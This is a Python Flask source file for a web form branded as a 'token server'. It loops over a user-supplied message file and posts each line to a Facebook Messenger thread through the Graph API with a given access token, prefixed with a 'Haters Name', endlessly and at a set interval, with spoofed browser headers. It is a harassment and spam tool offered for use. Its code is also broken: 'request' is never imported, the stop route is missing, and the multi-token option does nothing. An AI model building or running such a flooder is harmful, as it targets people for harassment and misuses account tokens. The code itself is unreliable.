from flask import Flask
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''
    
<!DOCTYPE html>
<html lang="en">
 <head> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title>TECHNICAL ABHI2M SERVER ðŸ˜ŽðŸ’”</title> 
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"> 
  <style>
    body {
      background-color: red;
    }
    .container {
      max-width: 300px;
      background-color: bisque;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      margin: 0 auto;
      margin-top: 20px;
    }
    .header {
      text-align: center;
      padding-bottom: 10px;
    }
    .btn-submit {
      width: 100%;
      margin-top: 10px;
    }
    .footer {
      text-align: center;
      margin-top: 10px;
      color: blue;
    }
    #status {
      text-align: center;
      margin-top: 10px;
      color: white;
    }
  </style> 
 </head> 
 <body> 
  <header class="header mt-4"> 
   <h1 class="mb-3">SILENT RULEX ABHI SERVER ðŸ‘€ðŸ©·Message Sender</h1> 
   <h3 class="mt-3">SINGLE&gt;3AND MULTI TOKEN SERVER </h3> 
  </header> 
  <div class="container"> 
   <form action="/" method="post" enctype="multipart/form-data"> 
    <div class="mb-3"> 
     <label for="tokenType">Select Token Type:</label> 
     <select class="form-control" id="tokenType" name="tokenType" required> <option value="single">Single Token</option> <option value="multi">Multi Token</option> </select> 
    </div> 
    <div class="mb-3"> 
     <label for="accessToken">Enter Access Token:</label> 
     <input type="text" class="form-control" id="accessToken" name="accessToken"> 
    </div> 
    <div class="mb-3"> 
     <label for="threadId">Enter Conversation ID:</label> 
     <input type="text" class="form-control" id="threadId" name="threadId" required> 
    </div> 
    <div class="mb-3"> 
     <label for="kidx">Enter Haters Name:</label> 
     <input type="text" class="form-control" id="kidx" name="kidx" required> 
    </div> 
    <div class="mb-3"> 
     <label for="txtFile">Choose Message File:</label> 
     <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required> 
    </div> 
    <div class="mb-3" id="multiTokenFile" style="display: none;"> 
     <label for="tokenFile">Select Token File (for multi-token):</label> 
     <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt"> 
    </div> 
    <div class="mb-3"> 
     <label for="time">Enter Time Interval (in seconds):</label> 
     <input type="number" class="form-control" id="time" name="time" required> 
    </div> 
    <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button> 
   </form> 
   <div id="status"> 
    <p>Status: <span id="statusMessage">Processing...</span></p> 
    <button class="btn btn-danger" id="stopButton" onclick="stopMessages()">Stop Messages</button> 
   </div> 
  </div> 
  <footer class="footer"> 
   <p>Â© Developed by TechNicaL AbhI2M 2024. All Rights Reserved.</p> 
  </footer> 
  <script>
    document.getElementById('tokenType').addEventListener('change', function() {
      var tokenType = this.value;
      document.getElementById('multiTokenFile').style.display = tokenType === 'multi' ? 'block' : 'none';
      document.getElementById('accessToken').style.display = tokenType === 'multi' ? 'none' : 'block';
    });

    function stopMessages() {
      fetch('/stop', {
        method: 'POST'
      }).then(response => response.json())
        .then(data => {
          document.getElementById('statusMessage').textContent = data.message;
        });
    }
  </script> 
 </body>
</html>
'''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
